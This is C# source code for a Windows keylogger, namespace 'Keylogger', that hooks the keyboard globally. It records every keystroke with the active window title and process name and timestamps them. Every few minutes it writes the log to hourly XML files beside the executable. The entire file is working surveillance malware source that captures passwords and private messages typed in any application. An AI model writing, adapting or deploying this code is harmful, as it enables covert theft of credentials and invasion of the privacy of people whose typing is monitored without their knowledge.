using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Keylogger
{
    class Program
    {
        private static Stack _appNames;
        private static Hashtable _logData;
        private static Hashtable _logDataHour;
        private static string _lastNameSaved;
        private static int _intervalFlush = 1;
        private static string _baseName = "keylogger";

        static void Main(string[] args)
        {
            try
            {
                if (args.Length != 0 && args.Length != 2)
                {
                    Console.WriteLine("Invalid number of parameters.");
                    Console.WriteLine("Usage: Keylogger.exe [\"OutputFileName\" NumericIntervalToFlushKeysToDisk]");
                    return;
                }

                if (args.Length == 2)
                {
                    _baseName = args[0];
                    _intervalFlush = int.Parse(args[1]);
                }

                var hooker = new UserActivityHook();
                hooker.KeyDown += HookerKeyDown;
                hooker.KeyPress += HookerKeyPress;

                _appNames = new Stack();
                _logData = new Hashtable();
                _logDataHour = new Hashtable();

                var lastTimeSaved = DateTime.Now;
                while (true)
                {
                    if ((DateTime.Now - lastTimeSaved).TotalMinutes >= _intervalFlush)
                    {
                        lastTimeSaved = DateTime.Now;
                        CheckAndSave();
                    }

                    Application.DoEvents();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        private static void HookerKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
                Logger("[Enter]");
            if (e.KeyData.ToString() == "Escape")
                Logger("[Escape]");
        }

        private static void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            if ((byte)e.KeyChar == 9)
                Logger("[TAB]");
            if ((byte)e.KeyChar == 8)
                Logger("[BackSpace]");
            else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
                Logger(e.KeyChar.ToString());
            else if (e.KeyChar == 32)
                Logger(" ");
            else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
                Logger("[Char\\" + ((byte)e.KeyChar) + "]");
        }

        private static void Logger(string txt)
        {
            var p = Process.GetProcessById(WinApi.GetWindowProcessID());
            var appName = p.ProcessName;
            var appltitle = WinApi.ActiveApplTitle().Trim().Replace("\0", "");
            var thisapplication = appltitle + "######" + appName;

            if (!_appNames.Contains(thisapplication))
            {
                _appNames.Push(thisapplication);
                _logData.Add(thisapplication, "");
            }

            var en = _logData.GetEnumerator();

            while (en.MoveNext())
            {
                if (en.Key.ToString() == thisapplication)
                {
                    var prlogdata = en.Value.ToString();

                    _logData.Remove(thisapplication);
                    _logDataHour.Remove(thisapplication);

                    _logData.Add(thisapplication, prlogdata + txt);
                    _logDataHour.Add(thisapplication, DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss"));
                    break;
                }
            }
        }

        private static void CheckAndSave()
        {
            if (_lastNameSaved == null)
            {
                //The first time save the name
                _lastNameSaved = DateTime.Now.ToString("dd-MM-yyyy-HH-mm-ss");
                SaveLogfile(Path.Combine(Application.StartupPath, _baseName + "-" + _lastNameSaved + ".xml"));
            }
            else
            {
                //If we have name, we use it
                SaveLogfile(Path.Combine(Application.StartupPath, _baseName + "-" + _lastNameSaved + ".xml"));

                //We check if we need change name file, because the hour changed!
                var lastSaveHour = _lastNameSaved.Substring(11, 2);
                if (lastSaveHour != DateTime.Now.Hour.ToString())
                {
                    ClearMemoryCache();
                    _lastNameSaved = DateTime.Now.ToString("dd-MM-yyyy-HH-mm-ss");
                }
            }
        }

        private static void SaveLogfile(string pathtosave)
        {
            try
            {
                var writer = new StreamWriter(pathtosave, false);
                var element = _logData.GetEnumerator();
                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine("");
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
                writer.WriteLine("");

                writer.Write("<ApplDetails>");
                while (element.MoveNext())
                {
                    writer.Write("<Apps_Log>");

                    writer.Write("<ProcessName>");
                    var processname = "<![CDATA[" + element.Key.ToString().Trim().Substring(0, element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal)).Trim() + "]]>";
                    processname = processname.Replace("\0", "");
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    var applname = "<![CDATA[" + element.Key.ToString().Trim().Substring(element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal) + 6).Trim() + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");

                    writer.Write("<LogDataHour>");
                    var ldataHour = ("<![CDATA[" + _logDataHour[element.Key] + "]]>").Replace("\0", "");
                    writer.Write(ldataHour);
                    writer.Write("</LogDataHour>");

                    writer.Write("<LogData>");
                    var ldata = ("<![CDATA[" + element.Value + "]]>").Replace("\0", "");
                    writer.Write(ldata);
                    writer.Write("</LogData>");

                    writer.Write("</Apps_Log>");
                }
                writer.Write("</ApplDetails>");

                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private static void ClearMemoryCache()
        {
            _logData.Clear();
            _appNames.Clear();
            _logDataHour.Clear();
        }
    }
}
